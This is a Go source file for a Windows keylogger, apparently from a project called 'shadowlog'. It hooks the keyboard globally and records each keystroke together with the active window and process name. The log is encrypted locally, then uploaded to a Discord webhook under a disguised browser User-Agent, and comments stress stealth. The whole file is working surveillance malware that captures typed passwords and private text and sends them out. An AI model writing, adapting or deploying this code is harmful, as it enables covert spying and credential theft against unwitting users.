package monitor

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"shadowlog/config"
	"github.com/moutend/go-hook/pkg/keyboard"
	"github.com/moutend/go-hook/pkg/types"
)

// Windows API function pointers for window and process information.
// These are used to get active window title and process name.
var (
	user32           = syscall.NewLazyDLL("user32.dll")
	procGetWindowText = user32.NewProc("GetWindowTextW")
	procGetForeground = user32.NewProc("GetForegroundWindow")
	procGetPID       = user32.NewProc("GetWindowThreadProcessId")

	kernel32         = syscall.NewLazyDLL("kernel32.dll")
	procOpenProcess  = kernel32.NewProc("OpenProcess")

	psapi            = syscall.NewLazyDLL("psapi.dll")
	procGetModName   = psapi.NewProc("GetModuleBaseNameW")

	procGetMessage       = user32.NewProc("GetMessageW")
	procTranslateMessage = user32.NewProc("TranslateMessage")
	procDispatchMessage  = user32.NewProc("DispatchMessage")
	procToUnicode        = user32.NewProc("ToUnicode")
	procGetKeyboardState = user32.NewProc("GetKeyboardState")
	procGetKeyState      = user32.NewProc("GetKeyState")
	procMapVirtualKey    = user32.NewProc("MapVirtualKeyW")
)

// MSG is the Windows message structure.
type MSG struct {
	Hwnd    uintptr
	Message uint32
	Wparam  uintptr
	Lparam  uintptr
	Time    uint32
	Pt      struct {
		X int32
		Y int32
	}
}

// Logger represents the keylogger instance.
// It holds configuration and batches keystroke data before reporting.
type Logger struct {
	Config    *config.Config // Configuration settings.
	Batch     []string       // Buffer for batching keystroke logs.
	Mu        sync.Mutex     // Mutex for safe batch access.
	LastHwnd    uintptr        // Cache for last active window handle.
	LastTitle   string         // Cache for last active window title.
	LogQueue    chan string    // Channel for reporting worker pool.
	LogCallback func(string)   // Optional callback for UI live preview.
}

// NewLogger creates a new Logger instance with the given configuration.
func NewLogger(cfg *config.Config, cb func(string)) *Logger {
	return &Logger{
		Config:      cfg,
		Batch:       make([]string, 0, 3),
		LogQueue:    make(chan string, 100),
		LogCallback: cb,
	}
}

// Start begins the keylogging process.
// It installs a global keyboard hook and processes keystroke events in a loop.
// The function runs indefinitely until the program is terminated.
func (l *Logger) Start() {
	// Channel to receive keyboard events from the hook.
	keyboardChan := make(chan types.KeyboardEvent, 100)

	// Install the global keyboard hook.
	if err := keyboard.Install(nil, keyboardChan); err != nil {
		return
	}
	defer keyboard.Uninstall()

	// 1. Initial Pulse: Verify writing to the unified storage file.
	if l.Config.LogLocal {
		// Try to append a "Monitor Started" pulse.
		ts := time.Now().Format("2006-01-02 15:04:05")
		l.report(fmt.Sprintf("[%s] [System] Monitor Started", ts))
	}

	// Ticker for periodic flushing (every 15 seconds).
	ticker := time.NewTicker(15 * time.Second)
	defer ticker.Stop()

	// Start the reporting worker pool (1 worker is enough for stealth).
	go l.worker()

	// Start event loop in a background goroutine.
	go func() {
		for {
			select {
			case ev, ok := <-keyboardChan:
				if !ok {
					return
				}
				// Only process key down events (WM_KEYDOWN = 0x0100).
				if ev.Message == 0x0100 {
					key := l.mapVKCode(uint32(ev.VKCode))
					if key == "" {
						continue
					}

					win := l.getActiveWindowInfo()
					ts := time.Now().Format("2006-01-02 15:04:05")
					logLine := fmt.Sprintf("[%s] [%s] %s", ts, win, key)

					l.Mu.Lock()
					l.Batch = append(l.Batch, logLine)
					// Report when batch reaches 3 entries.
					if len(l.Batch) >= 3 {
						combined := strings.Join(l.Batch, "\n")
						l.Batch = l.Batch[:0]
						l.Mu.Unlock()
						l.report(combined)
					} else {
						l.Mu.Unlock()
					}
					
					if l.LogCallback != nil {
						l.LogCallback(logLine)
					}
				}
			case <-ticker.C:
				// Periodic flush.
				l.Mu.Lock()
				if len(l.Batch) > 0 {
					combined := strings.Join(l.Batch, "\n")
					l.Batch = l.Batch[:0]
					l.Mu.Unlock()
					l.report(combined)
				} else {
					l.Mu.Unlock()
				}
			}
		}
	}()

	// Windows: To keep low-level hooks alive, we MUST run a message loop on this thread.
	// Without this, Windows will eventually timeout the hook or it will stop responding.
	var msg MSG
	for {
		ret, _, _ := procGetMessage.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
		if int32(ret) == -1 || ret == 0 {
			break
		}
		procTranslateMessage.Call(uintptr(unsafe.Pointer(&msg)))
		procDispatchMessage.Call(uintptr(unsafe.Pointer(&msg)))
	}
}

// mapVKCode converts a Windows virtual key code to a readable string.
// Returns an empty string for unmappable keys.
func (l *Logger) mapVKCode(vk uint32) string {
	// 1. Handle special non-printable keys first.
	switch vk {
	case 0x08: return "[BACKSPACE]"
	case 0x09: return "[TAB]"
	case 0x0D: return "[ENTER]"
	case 0x10, 0xA0, 0xA1: return "[SHIFT]"
	case 0x11, 0xA2, 0xA3: return "[CTRL]"
	case 0x12, 0xA4, 0xA5: return "[ALT]"
	case 0x14: return "[CAPSLOCK]"
	case 0x1B: return "[ESC]"
	case 0x20: return " " // Space
	case 0x21: return "[PAGEUP]"
	case 0x22: return "[PAGEDOWN]"
	case 0x23: return "[END]"
	case 0x24: return "[HOME]"
	case 0x25: return "[LEFT]"
	case 0x26: return "[UP]"
	case 0x27: return "[RIGHT]"
	case 0x28: return "[DOWN]"
	case 0x2E: return "[DELETE]"
	}

	// 2. Numpad Keys.
	if vk >= 0x60 && vk <= 0x69 {
		return fmt.Sprintf("%d", vk-0x60)
	}
	switch vk {
	case 0x6A: return "*"
	case 0x6B: return "+"
	case 0x6C: return "[SEPARATOR]"
	case 0x6D: return "-"
	case 0x6E: return "."
	case 0x6F: return "/"
	}

	// 3. Function Keys.
	if vk >= 0x70 && vk <= 0x87 {
		return fmt.Sprintf("[F%d]", vk-0x6F)
	}

	// 4. Advanced Mapping using ToUnicode for international support.
	var keyboardState [256]byte

	// Manually populate modifier states for ToUnicode.
	// This ensures Shift/AltGr/CapsLock are reflected for special symbols like @#! etc.
	modifiers := []uint32{0x10, 0x11, 0x12, 0x14} // Shift, Ctrl, Alt, CapsLock
	for _, m := range modifiers {
		ret, _, _ := procGetKeyState.Call(uintptr(m))
		if ret&0x8000 != 0 {
			keyboardState[m] = 0x80
		} else if m == 0x14 && ret&0x0001 != 0 { // CapsLock toggle bit
			keyboardState[m] = 0x01
		}
	}

	// We need the scan code for ToUnicode.
	scanCode, _, _ := procMapVirtualKey.Call(uintptr(vk), 0)

	var buffer [16]uint16
	ret, _, _ := procToUnicode.Call(
		uintptr(vk),
		uintptr(scanCode),
		uintptr(unsafe.Pointer(&keyboardState[0])),
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(len(buffer)),
		0,
	)

	if ret > 0 {
		return syscall.UTF16ToString(buffer[:ret])
	}

	return "" // Unmappable key.
}

// getActiveWindowInfo retrieves information about the currently active window.
// Returns a string in the format "process.exe - Window Title".
// Falls back to title only or "Unknown App" if process name unavailable.
func (l *Logger) getActiveWindowInfo() string {
	// Only supported on Windows.
	if runtime.GOOS != "windows" {
		return "Unknown"
	}

	// Get handle to foreground window.
	hwnd, _, _ := procGetForeground.Call()
	if hwnd == 0 {
		return "Idle"
	}

	// Caching logic: If HWND is the same, return cached title.
	l.Mu.Lock()
	if hwnd == l.LastHwnd && l.LastTitle != "" {
		title := l.LastTitle
		l.Mu.Unlock()
		return title
	}
	l.Mu.Unlock()

	// Get window title.
	tBuf := make([]uint16, 256)
	procGetWindowText.Call(hwnd, uintptr(unsafe.Pointer(&tBuf[0])), uintptr(len(tBuf)))
	title := syscall.UTF16ToString(tBuf)

	// Get process ID of the window.
	var pid uint32
	procGetPID.Call(hwnd, uintptr(unsafe.Pointer(&pid)))

	var pName string
	// Open process handle to get process name.
	hProc, _, _ := procOpenProcess.Call(0x1000|0x0010, 0, uintptr(pid))
	if hProc != 0 {
		defer syscall.CloseHandle(syscall.Handle(hProc))
		nBuf := make([]uint16, 256)
		procGetModName.Call(hProc, 0, uintptr(unsafe.Pointer(&nBuf[0])), uintptr(len(nBuf)))
		pName = syscall.UTF16ToString(nBuf)
	}

	finalInfo := "Unknown App"
	if title != "" && pName != "" {
		finalInfo = pName + " - " + title
	} else if pName != "" {
		finalInfo = pName
	} else if title != "" {
		finalInfo = title
	}

	// Update cache.
	l.Mu.Lock()
	l.LastHwnd = hwnd
	l.LastTitle = finalInfo
	l.Mu.Unlock()

	return finalInfo
}

// report sends the batched log data to configured destinations.
// Supports Discord webhook and/or local file logging.
// Runs asynchronously to avoid blocking the main logging loop.
func (l *Logger) report(content string) {
	select {
	case l.LogQueue <- content:
	default:
		// Queue full, drop log to avoid blocking and maintain stealth.
	}
}

// worker handles the actual reporting to Discord with persistence fallback.
func (l *Logger) worker() {
	for content := range l.LogQueue {
		// 1. ALWAYS Save to local storage first (Source of Truth).
		// This provides the fallback if Discord fails or internet is out.
		path := config.GetStoragePath()
		encrypted, err := l.encrypt([]byte(content))
		if err == nil {
			encoded := base64.StdEncoding.EncodeToString(encrypted)
			// Open in append mode.
			file, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
			if err == nil {
				file.WriteString(encoded + "\n")
				file.Close()
			}
		}

		// 2. Sync to Discord if configured.
		l.syncDiscord()
	}
}

// syncDiscord attempts to send all pending logs from the local file to Discord.
func (l *Logger) syncDiscord() {
	if l.Config.WebhookURL == "" {
		return
	}

	path := config.GetStoragePath()
	file, err := os.Open(path)
	if err != nil {
		return
	}
	defer file.Close()

	// Skip lines already sent.
	scanner := bufio.NewScanner(file)
	lineCount := 0
	var pendingLines []string

	for scanner.Scan() {
		lineCount++
		// The first line (idx 1) is always the config.
		// Logs start from index 2.
		if lineCount <= 1 || lineCount <= l.Config.LastSentIndex {
			continue
		}

		// This line is unsent.
		line := scanner.Text()
		data, err := base64.StdEncoding.DecodeString(line)
		if err != nil {
			continue
		}
		decrypted, err := l.decrypt(data)
		if err != nil {
			continue
		}
		pendingLines = append(pendingLines, string(decrypted))
	}

	if len(pendingLines) == 0 {
		return
	}

	// Send pending lines in batches to Discord.
	// We send the whole backlog to fulfill "sent when internet is back".
	combined := strings.Join(pendingLines, "\n")
	payload := map[string]string{"content": fmt.Sprintf("```\n%s\n```", combined)}
	data, _ := json.Marshal(payload)

	req, err := http.NewRequest("POST", l.Config.WebhookURL, bytes.NewBuffer(data))
	if err != nil {
		return
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36")

	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.Do(req)
	if err == nil && resp.StatusCode < 300 {
		// Success! Update the LastSentIndex in the config.
		l.Config.LastSentIndex = lineCount
		config.SaveConfig(l.Config)
		resp.Body.Close()
	}
}

// decrypt performs AES-256-GCM decryption for sync verification.
func (l *Logger) decrypt(data []byte) ([]byte, error) {
	block, err := aes.NewCipher(config.GetEncryptionKey())
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

// encrypt performs AES-256-GCM encryption on the given data.
// Returns a combined byte slice of [nonce][ciphertext].
func (l *Logger) encrypt(data []byte) ([]byte, error) {
	block, err := aes.NewCipher(config.GetEncryptionKey())
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}

	return gcm.Seal(nonce, nonce, data, nil), nil
}
